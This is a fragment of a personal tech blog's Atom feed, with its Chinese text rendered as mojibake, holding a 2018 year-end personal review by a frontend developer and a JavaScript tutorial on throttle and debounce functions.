      <category term="debugger" scheme="http://zhoushaw.github.io/tags/debugger/"/>
    
  </entry>
  
  <entry>
    <title>2018å¹´ç»ˆæ€»ç»“</title>
    <link href="http://zhoushaw.github.io/2019/01/09/2018%E6%80%BB%E7%BB%93/"/>
    <id>http://zhoushaw.github.io/2019/01/09/2018æ€»ç»“/</id>
    <published>2019-01-09T02:17:35.000Z</published>
    <updated>2019-04-14T13:54:11.944Z</updated>
    
    <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>Hi,æˆ‘åœ¨æµ™æ±Ÿæ­å·ï¼Œç°åœ¨æ˜¯åŒ—äº¬æ—¶é—´2019.1.9 10:17ï¼Œè¿™é‡Œæ˜¯ä¸€ä»½æ™šåˆ°çš„å¹´ç»ˆæ€»ç»“ã€‚å¹´ç»ˆè¿™æ®µæ—¶é—´éå¸¸å¿™ï¼Œå¾ˆæƒ³æç¬”å†™ä¸‹è¿™ä¸€å¹´ï¼Œä½†å§‹ç»ˆæŠ½ä¸å‡ºæ—¶é—´(å°±æ˜¯æ‡’)ã€‚</p><p>ä»2018-2019æ›´å¤šçš„æ˜¯å¿ƒæ€ä¸Šçš„è½¬å˜ï¼Œä»å®ä¹ å¼€å§‹ç®—èµ·ï¼Œæ»¡æ‰“æ»¡ç®—å·²ç»å·¥ä½œä¸€å¹´æ—¶é—´äº†ã€‚ä»å­¦æ ¡åˆ°ç¤¾ä¼šçœ‹åˆ°äº†å®Œå¤‡çš„å·¥ç¨‹ä½“ç³»ï¼Œçœ‹åˆ°äº†ä»¥åçš„ç”Ÿæ´»å’Œæœªæ¥ã€‚</p><div><a id="more"></a></div><p>æ¥æ­å·²å¿«åŠå¹´äº†ï¼Œ2018å¹´ä»å­¦ç”Ÿå®Œæˆäº†ä¸€ä¸ªç¤¾ä¼šäººçš„è½¬å˜ï¼Œç»†æƒ³2018å¹´åˆç«‹ä¸‹çš„flagå¥½åƒæ²¡å¹¶å®Œæˆå‡ ä¸ªğŸ¤£ã€‚</p><blockquote><p>2018å¹´åˆç«‹ä¸‹çš„flag:</p></blockquote><ul><li>è‹±è¯­æ°´å¹³å…­çº§ä»¥ä¸Šï¼ŒæŠ€æœ¯æ–‡ç« è§†é¢‘å¬å†™æ— é˜»ç¢</li><li>æŠ€æœ¯å¹¿åº¦æå‡ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºå‰ç«¯æŠ€æœ¯:nodeJsã€ReactNativeã€Python</li><li>åšå‡ ä¸ªæœ‰æŠ€æœ¯æ°´å¹³çš„å¼€æºé¡¹ç›®</li><li>å¥èº«ã€èº«ä½“ç´ è´¨æ°´å¹³æå‡(æ¯•ç«Ÿèº«ä½“æ‰æ˜¯é©å‘½çš„æœ¬é’±)</li><li>æŠ€æœ¯æ·±åº¦æå‡:ç ”ç©¶Vueæºç ã€Reactæºç ï¼ŒåŸºç¡€å˜å¾—æ›´åŠ ç‰¢å›º</li></ul><p>ç»†æƒ³è¿‡å»çš„ä¸€å¹´å¹¶æœªå‘ç°è‡ªå·±æœ‰å¤ªå¤§çš„æˆé•¿ï¼Œä¹Ÿæ²¡æœ‰ä»æƒ³è±¡çš„åˆçº§ç¨‹åºå‘˜è¿ˆå‘é«˜çº§å·¥ç¨‹å¸ˆï¼Œè‹±è¯­æ°´å¹³ä¹Ÿæ²¡æœ‰æ˜æ˜¾æå‡ï¼ŒæŠ€æœ¯å¹¿åº¦å’Œæ·±åº¦ä¹Ÿæ²¡æœ‰å¤ªå¤§æå‡ã€‚ä¸è¿‡å€¼å¾—åº†å¹¸æ¥åˆ°è˜‘è‡è¡—çœ‹åˆ°äº†æ›´å®Œå–„çš„å·¥ç¨‹ä½“ç³»ï¼Œèº«ä½“ç´ è´¨ä¹Ÿé€æ¸æ¢å¤åˆ°äº†ä¸€ä¸ªæ­£å¸¸æ°´å¹³(è¢«ä¸Šä¸€å®¶å…¬å¸æ‘§æ®‹äº†ğŸ¤£)ã€‚</p><p>ä»äº‹å‰ç«¯å·¥ä½œå·²ç»æ¥è¿‘ä¸€å¹´äº†ï¼Œæˆ‘åœ¨æƒ³è¿™æ˜¯æˆ‘å½“åˆå…¥è¡Œå‰ç«¯çš„åˆå¿ƒå—ï¼Œæ¯å¤©ç¼–å†™ä¸šåŠ¡ä»£ç ï¼Œåšç€é‡å¤çš„å·¥ä½œã€‚ç”Ÿæ´»å¹¶æ²¡æœ‰æˆ‘æƒ³æƒ³çš„é‚£æ ·å¯Œæœ‰åˆ›é€ åŠ›ï¼Œå¦‚ä½•é‡æ–°æ‰¾å›å¯¹æŠ€æœ¯çš„æ¿€æƒ…å‘¢ã€‚</p><h3 id="æ–°å¹´å±•æœ›"><a href="#æ–°å¹´å±•æœ›" class="headerlink" title="æ–°å¹´å±•æœ›"></a>æ–°å¹´å±•æœ›</h3><p>ç®—äº†å¹´ç»ˆæ€»ç»“åº”è¯¥æŒ‰ç…§æƒ¯ä¾‹ç«‹ä¸‹æ–°å¹´flag(å¸Œæœ›ä»Šå¹´å¹´åº•ä¸ä¼šè¢«æ‰“è‚¿è„¸):</p><blockquote><p>éœ€è¦çœ‹å®Œçš„ä¹¦ç±:</p></blockquote><ul><li><p>æŠ€æœ¯ç±»</p><ul><li>ä½ ä¸çŸ¥é“çš„javascript</li><li>javascriptå‡½æ•°ç¼–ç¨‹æŒ‡å—</li><li>javascripté«˜çº§ç¨‹åºè®¾è®¡</li><li>javascriptè®¾è®¡æ¨¡å¼</li><li>cssä¸–ç•Œ</li><li>è®¡ç®—æœºç½‘ç»œ</li><li>ç¼–è¯‘åŸç†</li><li>è®¡ç®—æœºç»„æˆåŸç†</li></ul></li><li><p>å…¶ä»–ç±»å‹</p><ul><li>äººç±»ç®€å²</li><li>æµæµªåœ°çƒ</li></ul></li></ul><blockquote><p>éœ€è¦å­¦ä¹ çš„æ–°æŠ€æœ¯:</p></blockquote><ul><li>flutter</li><li>Electron</li><li>WebAssembly</li><li>chromeæ’ä»¶å¼€å‘</li></ul><p>è‡³å°‘çœ‹å®Œåæœ¬:</p><ul><li>ä¸‰ä½“</li><li>äººç±»ç®€å²</li></ul><blockquote><p>æ–°çš„è¯­è¨€</p></blockquote><ul><li>C++</li><li>Java</li></ul><blockquote><p>ç”Ÿæ´»æ–¹é¢</p></blockquote><ul><li>ä»Šå¹´å­˜æ¬¾7ä¸‡+å§</li><li>æ‹¿åˆ°é©¾ç…§</li><li>å¸¦å¥¹å›å®¶è§å®¶é•¿</li></ul><h2 id="è¿‡å»ä¸€å¹´çš„å›é¡¾"><a href="#è¿‡å»ä¸€å¹´çš„å›é¡¾" class="headerlink" title="è¿‡å»ä¸€å¹´çš„å›é¡¾"></a>è¿‡å»ä¸€å¹´çš„å›é¡¾</h2><p>å€¼å¾—åº†å¹¸çš„æ˜¯ä»æ·±åœ³åˆ°æ­å·ï¼Œæ¥åˆ°è˜‘è‡è¡—ï¼ŒåŠ å…¥äº†è‡ªå·±æœŸå¾…çš„å›¢é˜Ÿï¼Œä½†æˆé•¿ä¸€ç›´éƒ½æ˜¯å±äºè‡ªå·±çš„äº‹æƒ…ï¼Œæ— è®ºèº«è¾¹äººå¤šä¹ˆä¼˜ç§€ä¸€åˆ‡éƒ½éœ€è¦é è‡ªå·±ã€‚19å¹´æƒ³æé†’è‡ªå·±æœ€ç»ˆè¦çš„ä¸€ä»¶äº‹æƒ…:å¸¦è„‘å­å¹²æ´»ï¼Œä»é¡¹ç›®è®¾è®¡åˆ°æœ€ç»ˆè½åœ°ï¼Œä¸€å®šè¦æ—¶åˆ»ä¿æŒç´§å¼ ã€ç´§è¿«æ„Ÿï¼Œæ•¬ç•æ¯ä¸€è¡Œä»£ç ï¼Œå› ä¸ºä½ æ°¸è¿œä¸çŸ¥é“ä½ è®¤ä¸ºçš„ä¸€è¡Œç®€å•çš„ä»£ç ä¼šå¸¦æ¥å¤šå¤§çš„ç¾éš¾ã€‚</p><p>18å¹´æ²¡æœ‰å‘ç”Ÿå¤§äº‹æ•…å€¼å¾—åº†å¹¸ï¼Œåœ¨æ”¯ä»˜å›¢é˜Ÿçš„æ—¶å€™ï¼Œåœ¨ç°é‡‘è´·ä¸šåŠ¡ä¸­å¯¼è‡´äº†ä¸€å¤§æ‰¹é£é™©ç”¨æˆ·æ”¾æ¬¾æˆåŠŸï¼Œè™½ç„¶åç«¯ä¸»è¦è´£ä»»ï¼Œä½†ä½œä¸ºé¡¹ç›®çš„å‰ç«¯å¼€å‘ä¹Ÿæ²¡æœ‰åšåˆ°åŠæ—¶å‘ç°é£é™©ï¼Œå¯¼è‡´åé¢å¤§æ‰¹é£é™©ç”¨æˆ·å€Ÿæ¬¾æˆåŠŸã€‚è¿˜å¥½åé¢é£é™©ç”¨æˆ·è·Ÿè¿›å‘ç°æ•°æ®ååˆ†æ­£å¸¸ï¼Œè¿˜å¥½åœ¨è´·å‰é£æ§åšçš„ä¸é”™ï¼Œä¸ç„¶çœŸç®—çš„ä¸Šæ˜¯P0çº§åˆ«çš„äº‹æ•…äº†ã€‚</p><p>18å¹´11æœˆä»½ä¸­æ—¬çš„æ—¶å€™ï¼Œä»æ”¯ä»˜éƒ¨é—¨è½¬åˆ°äº†ä¸»ç«™ã€‚åŸæ¥çš„é—²é±¼ç”Ÿæ´»å½»åº•æ¶ˆå¤±äº†ï¼Œå°±ä¸€ä¸ªå¿™~ï¼Œå¿™ç¢Œçš„ç”Ÿæ´»è®©è‡ªå·±æ²¡æ³•ğŸ¤”,æ€ä¹ˆæ ·æ‰èƒ½è®©è‡ªå·±æœ‰å……è¶³çš„æ—¶é—´æ€è€ƒå¹¶æå‡å‘¢,19å¹´å¯èƒ½è¦ä»ä»¥ä¸‹å‡ æ–¹é¢å…¥æ‰‹:</p><ul><li>éœ€æ±‚æå®¡å‰åšè¶³åŠŸè¯¾ï¼Œåˆ†ææ‰€æœ‰çš„æŠ€æœ¯éš¾ç‚¹ï¼Œéœ€æ±‚ä¼˜åŒ–ï¼Œåœ¨ä¸å½±å“åŠŸèƒ½çš„åŒæ—¶æå‡ç”Ÿäº§æ•ˆç‡</li><li>æ’æœŸåˆç†åŒ–ï¼Œä¸è¦è®©è‡ªå·±æƒ³18å¹´å¹´æœ«é‚£æ ·å¿™æ­»å¿™æ´»çš„æŠŠéœ€æ±‚èµ¶å‡ºæ¥ï¼Œæ¯•ç«Ÿè€å¤§éƒ½è¯´ä¸è¦åŠ ç­äº†~</li><li>å¤šæ€»ç»“ï¼Œæ—¢ç„¶éœ€æ±‚å¤šé‚£å°±ä»åšéœ€æ±‚ä¸­å­¦ä¹ å§ï¼Œé€æ­¥æå‡å¼€å‘æ•ˆç‡ï¼Œé‡åˆ°é—®é¢˜åŠæ—¶è®°å½•å¹¶æ·±ç©¶é—®é¢˜å‡ºç°çš„åŸå› åŠèƒŒåä¸€ç³»åˆ—çš„æŠ€æœ¯ç‚¹</li></ul><p>æœ€æƒ³è¦æå‡çš„è‹±è¯­æ–¹é¢å¹¶æ²¡æœ‰å¾ˆå¤§çš„æå‡ğŸ˜¢ï¼Œ19å¹´æƒ³åœ¨è¿™æ–¹é¢åŠ å¼ºã€‚æ¯•ç«Ÿåšè½¯ä»¶å¼€å‘ä¸èƒ½åªæå‡æŠ€æœ¯æ–¹é¢çš„çŸ¥è¯†ï¼Œè½¯å®åŠ›ä¹Ÿç›¸å½“é‡è¦ï¼Œåœ¨19å¹´æœ‰å“ªäº›è½¯å®åŠ›éœ€è¦æå‡çš„å‘¢ï¼Œè‹±è¯­æ–¹é¢çš„èƒ½åŠ›ã€é˜…è¯»èƒ½åŠ›ã€å†™ä½œèƒ½åŠ›ã€æ²Ÿé€šäº¤æµèƒ½åŠ›ï¼Œåªè¦æŠŠè¿™å‡ æ–¹é¢çš„åŸºç¡€èƒ½åŠ›æå‡ã€åŠ å¼ºï¼Œåœ¨åé¢çš„å·¥ä½œç”Ÿæ´»ä¸­æ‰èƒ½èµ°çš„æ›´ç¨³å¥ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h3&gt;&lt;p&gt;Hi,æˆ‘åœ¨æµ™æ±Ÿæ­å·ï¼Œç°åœ¨æ˜¯åŒ—äº¬æ—¶é—´2019.1.9 10:17ï¼Œè¿™é‡Œæ˜¯ä¸€ä»½æ™šåˆ°çš„å¹´ç»ˆæ€»ç»“ã€‚å¹´ç»ˆè¿™æ®µæ—¶é—´éå¸¸å¿™ï¼Œå¾ˆæƒ³æç¬”å†™ä¸‹è¿™ä¸€å¹´ï¼Œä½†å§‹ç»ˆæŠ½ä¸å‡ºæ—¶é—´(å°±æ˜¯æ‡’)ã€‚&lt;/p&gt;
&lt;p&gt;ä»2018-2019æ›´å¤šçš„æ˜¯å¿ƒæ€ä¸Šçš„è½¬å˜ï¼Œä»å®ä¹ å¼€å§‹ç®—èµ·ï¼Œæ»¡æ‰“æ»¡ç®—å·²ç»å·¥ä½œä¸€å¹´æ—¶é—´äº†ã€‚ä»å­¦æ ¡åˆ°ç¤¾ä¼šçœ‹åˆ°äº†å®Œå¤‡çš„å·¥ç¨‹ä½“ç³»ï¼Œçœ‹åˆ°äº†ä»¥åçš„ç”Ÿæ´»å’Œæœªæ¥ã€‚&lt;/p&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="life" scheme="http://zhoushaw.github.io/categories/life/"/>
    
    
      <category term="life" scheme="http://zhoushaw.github.io/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>throttle å’Œ debounce</title>
    <link href="http://zhoushaw.github.io/2018/10/23/learning/font-end/js/throttle%20%E5%92%8C%20debounce/"/>
    <id>http://zhoushaw.github.io/2018/10/23/learning/font-end/js/throttle å’Œ debounce/</id>
    <published>2018-10-23T00:07:00.000Z</published>
    <updated>2019-04-14T13:54:11.949Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>throttle å’Œ debounceæ˜¯æ§åˆ¶é¢‘ç‡çš„é«˜é˜¶å‡½æ•°ï¼Œè¿”å›ä¸€ä¸ªåŒ…è£…åçš„åŒ¿åå‡½æ•°</p></blockquote><p>åœ¨å®é™…å·¥ä½œä¸­çš„å¾ˆå¤šåœºæ™¯ä¸‹éƒ½ä¼šä½¿ç”¨åˆ°è¿™ä¸¤ä¸ªé«˜é˜¶å‡½æ•°ï¼Œå¹¶ä¸”åœ¨javascriptä¸­åˆ©ç”¨äº†é—­åŒ…è¿™ä¸€ç‰¹æ€§ã€‚ä¸‹é¢å¯¹è¿™ä¸¤ä¸ªå‡½æ•°è¿›è¡Œè¯¦ç»†è®²è§£<br>åº”ç”¨åœºæ™¯:</p><ul><li>resize é‡æ–°è®¡ç®—æ ·å¼å¸ƒå±€   â€“debounce</li><li>inputè¾“å…¥åœæ­¢1sæ—¶ï¼Œè·å–ajaxè¯·æ±‚     â€“debounce</li><li>scroll è®¡ç®—å½“å‰æ˜¯å¦å¤§äºå›ºå®šå€¼ï¼Œæ˜¾ç¤ºå¤´éƒ¨   â€“throttle<div><a id="more"></a></div></li></ul><h2 id="throttle"><a href="#throttle" class="headerlink" title="throttle"></a>throttle</h2><p>throttleä¹Ÿå¯ä»¥ç§°ä¹‹ä¸ºèŠ‚æµå‡½æ•°ï¼Œä¸»è¦ç”¨äºæ§åˆ¶ä¸€æ®µæ—¶é—´å†…ï¼Œåªå…è®¸æ‰§è¡Œä¸€æ¬¡æŒ‡å®šå‡½æ•°ã€‚ç±»ä¼¼äºæ‰“å¼€é˜€é—¨çš„æ°´é¾™å¤´ï¼Œæ¯è¿‡å›ºå®šçš„æ—¶é—´å†…ï¼Œæ»´å‡ºä¸è¶…è¿‡ä¸€æ»´æ°´</p><p>ä¸»è¦åœºæ™¯ç”¨äº:</p><ul><li>scroll</li><li>resize</li><li>mouse move</li></ul><p>åœ¨æˆ‘ä»¬çš„å®é™…å·¥ä½œä¸­ï¼ŒåŸºäºæ€§èƒ½å’Œæ•ˆç‡ä¸Šçš„è€ƒè™‘ï¼Œè¦é™åˆ¶å‡½æ•°çš„æ‰§è¡Œé¢‘ç‡å¯ä»¥ä½¿ç”¨throttle</p><p>ä»¥åœ°é“ä¸ºä¾‹è¿›è¡Œè¯´æ˜:</p><p>æŸä¸ªå‡½æ•°å»ä¹˜ååœ°é“ï¼Œå¿…é¡»ç­‰å¾…ğŸš‡åˆ°ç«™åï¼Œæ‰èƒ½ä¸Šè½¦ã€‚ğŸš‡åˆ°ç«™å‡½æ•°å¯ä»¥ä¸Šè½¦ï¼Œä½†åœ¨å›ºå®šæ—¶é—´ç‚¹åï¼Œä¸ç®¡æœ‰æ²¡æœ‰äººç»§ç»­ä¸Šè½¦ï¼ŒğŸš‡å°†ä¼šå‘è½¦ã€‚</p><p>åœ¨å®é™…å·¥ä½œä¸­çš„åº”ç”¨ï¼Œåˆ—å¦‚:</p><p>æ·˜å®ç½‘éœ€è¦åœ¨ç”¨æˆ·æ»‘åŠ¨æ»šè½®ï¼Œè·ç¦»é¡¶éƒ¨500pxæ—¶ï¼Œéšè—é¡¶éƒ¨å¯¼èˆªæ ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦å¯¹ç”¨æˆ·çš„æ»‘åŠ¨äº‹ä»¶è¿›è¡Œç›‘å¬ï¼Œå½“ç”¨æˆ·è¿›è¡Œæ»‘åŠ¨æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è·å–åˆ°ç”¨æˆ·å½“å‰æ»‘åŠ¨çš„è·ç¦»ï¼Œä¸500pxè¿›è¡Œæ¯”è¾ƒã€‚å½“ç”¨æˆ·çš„æ»‘åŠ¨è·ç¦»å¤§äºç­‰äº500æ—¶ï¼Œæ‰§è¡Œéšè—æ“ä½œã€‚</p><p>é€šå¸¸å®ç°:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&quot;scroll&quot;, () =&gt; &#123;</span><br><span class="line">    let scrollTop = document.documentElement.scrollTop</span><br><span class="line">    if (scrollTop &gt;= 500) &#123;</span><br><span class="line">       // éšè—å¤´éƒ¨é€»è¾‘</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ»šåŠ¨äº‹ä»¶çš„è§¦å‘é¢‘ç‡éå¸¸é«˜ï¼Œè¿™æ ·å°†ä¼šé€ æˆæ€§èƒ½ä¸Šçš„æµªè´¹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡throttleå‡½æ•°æ¥æ§åˆ¶é¢‘ç‡ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶ç”¨æˆ·åœ¨æ»šåŠ¨æ»šè½®æ—¶ï¼Œåœ¨500æ¯«ç§’å†…åªè§¦å‘ä¸€æ¬¡æ£€æµ‹ï¼Œå½“å‰ç”¨æˆ·è·ç¦»æ˜¯å¦è·ç¦»é¡¶éƒ¨å¤§äºç­‰äº500</p><p>å…·ä½“å®ç°:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># throttleå‡½æ•°</span><br><span class="line">function throttle(fn,delay = 250)&#123;</span><br><span class="line">    let timer;</span><br><span class="line">    let last;</span><br><span class="line">    </span><br><span class="line">    return function () &#123;</span><br><span class="line">        let now = +new Date();</span><br><span class="line">        if (last &amp;&amp; last + delay &gt; now) &#123;</span><br><span class="line">            clearTimeout(timer);</span><br><span class="line">            timer = setTimeout(function () &#123;</span><br><span class="line">                last = now;</span><br><span class="line">                fn.apply(this, arguments);</span><br><span class="line">            &#125;,delay)</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            last = now;</span><br><span class="line">            fn.apply(this, arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="debounce"><a href="#debounce" class="headerlink" title="debounce"></a>debounce</h2><p>debounceæ›´ç±»ä¼¼äºæŒ‰å‹çš„å¼¹ç°§ï¼Œå½“ä½ ç”¨åŠ›æŒ‰å‹æ—¶ï¼Œå¼¹ç°§æ˜¯ä¸ä¼šå¼¹èµ·çš„ã€‚ä¹Ÿå¯ä»¥æ¯”å–»æˆç”µæ¢¯ï¼Œç”µæ¢¯åœ¨ä¸€å±‚åœç•™æ—¶ï¼Œåªè¦æœ‰äººè¿›å…¥å°±ä¼šä¸€ç›´é™·å…¥ç­‰å¾…è¿›å…¥çŠ¶æ€ï¼Œç­‰åˆ°æ²¡æœ‰äººè¿›å…¥æ—¶å°±ä¼šç§»åŠ¨ã€‚</p><p>ä¾‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä»¥è¾“å…¥æ¡†çš„è¾“å…¥äº‹ä»¶ä¸ºä¾‹ï¼Œæ·˜å®ç½‘æœ‰ä¸€ä¸ªé“¶è¡Œå¡æ·»åŠ é¡µé¢ï¼Œå½“ç”¨æˆ·åœ¨è¾“å…¥æ¡†è¾“å…¥é“¶è¡Œå¡æ—¶ï¼Œä¼šé€šè¿‡ajaxè¯·æ±‚è·å–å½“å‰é“¶è¡Œå¡ç±»å‹ï¼Œå¹¶æ£€æµ‹æ˜¯å¦æ”¯æŒã€‚è‹¥ç”¨æˆ·æ¯è¾“å…¥ä¸€ä¸ªæ•°å­—å°±è¿›è¡Œæ ¡éªŒï¼Œä¼šé€ æˆæ€§èƒ½ä¸Šçš„æµªè´¹ï¼Œå¯ä»¥é€šè¿‡debounceé˜²æŠ–å‡½æ•°ï¼Œè®¾ç½®ç”¨æˆ·åœæ­¢è¾“å…¥ä¸€ç§’åï¼Œå¯¹é“¶è¡Œå¡è¿›è¡Œæ ¡éªŒè¯†åˆ«ã€‚</span><br></pre></td></tr></table></figure><p>å…·ä½“å®ç°:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function debounce(fn, delay = 1000) &#123;</span><br><span class="line">    var timer;</span><br><span class="line">    var context = this;</span><br><span class="line">    return function() &#123;</span><br><span class="line">        if (timer) &#123;</span><br><span class="line">            clearTimeout(timer);</span><br><span class="line">            timer = setTimeout(function() &#123;</span><br><span class="line">                fn.apply(context,arguments);</span><br><span class="line">            &#125;, delay)</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            timer = setTimeout(function() &#123;</span><br><span class="line">                fn.apply(context,arguments);</span><br><span class="line">            &#125;, delay)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;throttle å’Œ debounceæ˜¯æ§åˆ¶é¢‘ç‡çš„é«˜é˜¶å‡½æ•°ï¼Œè¿”å›ä¸€ä¸ªåŒ…è£…åçš„åŒ¿åå‡½æ•°&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;åœ¨å®é™…å·¥ä½œä¸­çš„å¾ˆå¤šåœºæ™¯ä¸‹éƒ½ä¼šä½¿ç”¨åˆ°è¿™ä¸¤ä¸ªé«˜é˜¶å‡½æ•°ï¼Œå¹¶ä¸”åœ¨javascriptä¸­åˆ©ç”¨äº†é—­åŒ…è¿™ä¸€ç‰¹æ€§ã€‚ä¸‹é¢å¯¹è¿™ä¸¤ä¸ªå‡½æ•°è¿›è¡Œè¯¦ç»†è®²è§£&lt;br&gt;åº”ç”¨åœºæ™¯:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;resize é‡æ–°è®¡ç®—æ ·å¼å¸ƒå±€   â€“debounce&lt;/li&gt;
&lt;li&gt;inputè¾“å…¥åœæ­¢1sæ—¶ï¼Œè·å–ajaxè¯·æ±‚     â€“debounce&lt;/li&gt;
&lt;li&gt;scroll è®¡ç®—å½“å‰æ˜¯å¦å¤§äºå›ºå®šå€¼ï¼Œæ˜¾ç¤ºå¤´éƒ¨   â€“throttle&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
</feed>
